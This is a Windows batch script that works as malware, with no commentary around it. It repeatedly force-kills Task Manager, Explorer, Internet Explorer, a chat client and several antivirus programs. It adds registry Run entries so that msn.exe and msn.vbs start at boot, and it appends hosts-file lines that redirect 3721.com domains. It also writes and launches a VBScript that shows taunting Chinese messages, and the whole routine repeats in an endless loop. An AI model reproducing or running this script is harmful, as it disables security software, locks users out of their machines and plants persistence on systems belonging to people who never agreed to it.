@echo off
:1
taskkill /f  /t /im taskmgr.exe
taskkill /f  /t /im IEXPLORE.exe
taskkill /f /t /im ravmond.exe
taskkill /f /t /im ravmon.exe
taskkill /f /t /im ravstub.exe
taskkill /f /t /im ravtask.exe
taskkill /f /t /im kav.exe
taskkill /f /t /im kavscr.exe
taskkill /f /t /im kv.exe
taskkill /f /t /im kvself.exe
taskkill /f /t /im nod32krn.exe
taskkill /f /t /im nod32kui.exe
taskkill /f /t /im qq.exe
taskkill /f /t /im ttplayer.exe
taskkill /f /t /im explorer.exe
@echo Windows Registry Editor Version 5.00>>c:\text.reg

@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>c:\text.reg
@echo "MM"="C:\\windows\\msn.exe">>c:\text.reg
@echo "vbs"="C:\\windows\\msn.vbs">>c:\text.reg
reg import C:\text.reg
del c:\text.reg
copy msn.exe C:\windows
@echo lwn.wy8.net       3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo lwn.wy8.net       3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo lwn.wy8.net       cnsmin.3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo lwn.wy8.net       cnsmin.3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo lwn.wy8.net       download.3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo lwn.wy8.net       download.3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo lwn.wy8.net       www.3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo lwn.wy8.net       www.3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
c:\windows\msn.vbs
goto 1



